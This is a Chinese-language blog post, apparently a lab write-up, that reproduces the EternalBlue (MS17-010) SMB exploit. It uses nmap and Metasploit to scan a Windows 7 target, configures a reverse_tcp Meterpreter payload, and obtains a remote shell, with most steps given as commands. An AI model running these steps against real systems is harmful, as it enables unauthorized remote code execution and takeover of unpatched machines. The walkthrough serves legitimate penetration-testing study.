---
title: 永恒之蓝复现
author: czk
categories:
- 漏洞利用
tags: 
- 漏洞利用
- 永恒之蓝
- MS17-010
date: 2020-08-14
---

# 前言

EternalBlue(永恒之蓝)是黑客组织在漏洞利用框架中的一个针对SMB服务进行攻击的模块，从2017年爆发到现在，这个Exploit持续不断的被恶意利用.通过Tcp端口445和139利用SMV v1远程代码执行漏洞,无需用户任何操作，不法分子就能在电脑上植入恶意软件。

由于工作需要，需要复现一下渗透过程，下面记录一下：

<!-- more -->

# 复现环境

攻击机：  kali-linux-2020.2-amd64

靶    机：  Windows_7_ultimate_with_sp1_x64



主机发现

​	使用nmap对靶机 ip 扫描，确认端口是否打开

![nmap_ip](/pic/czk/Eternalblue/nmap_ip.png)

扫描到开放了445端口，永恒之蓝就是利用的445端口的smb服务



进入MSF框架

​	kail@kali:~$ msfconsole

查看漏洞模块 search ms17-010

![searchms17010](/pic/czk/Eternalblue/searchms17010.png)

​	可以看到有2个模块： auxiliary（辅助）模块和exploit（攻击）模块；辅助模块主要用于网络攻防前期的踩点，信息搜集；

使用辅助模块扫描

​	msf> use auxiliary/scanner/smb/smb_ms17_010

![use_auxiliary](/pic/czk/Eternalblue/use_auxiliary.png)

查看模块配置参数

​	msf> show options

![showoptions](/pic/czk/Eternalblue/showoptions.png)

​	Required列为yes的选项对应的Current Setting项需要填写。



设置攻击目标, 然后再次查看配置参数

![setrhosts](/pic/czk/Eternalblue/setrhosts.png)

​	确认RHOSTS对应项被设置了靶机IP；



执行扫描

![runresult1](/pic/czk/Eternalblue/runresult1.png)

​	显示可以使用MS17-010漏洞攻击成功，搜集到了主机系统信息； 接下来就可以执行攻击了；



使用攻击模块对靶机攻击

​	use exploit/windows/smb/ms17_010_eternalblue

![useexploit](/pic/czk/Eternalblue/useexploit.png)

设置攻击载荷

​	查看载荷可以使用show payloads(这里不再展示)

​	因为靶机选用的64位所以选择x64的payload,

​	msf5 exploit(windows/smb/ms17_010_eternalblue) >  set payload windows/x64/meterpreter/reverse_tcp

设置目标ip

​	msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.1.71

设置反弹ip  (攻击成功后建立反向连接，即攻击机ip,获取本地ip, 在shell中输入sudo ifconfig)

​	msf5 exploit(windows/smb/ms17_010_eternalblue) > set lhosts 192.168.1.52



最后的配置就是下图的样子，注意反弹端口默认是4444，可以更改

![exploit_show](/pic/czk/Eternalblue/exploit_show.png)

执行攻击

![win](/pic/czk/Eternalblue/win.png)

成功后，会出现命令提示符meterpreter >,这时我们输入 shell ,即切到到目标机windows shell，接下来就可以执行任意操作了。

![shell](/pic/czk/Eternalblue/shell.png)











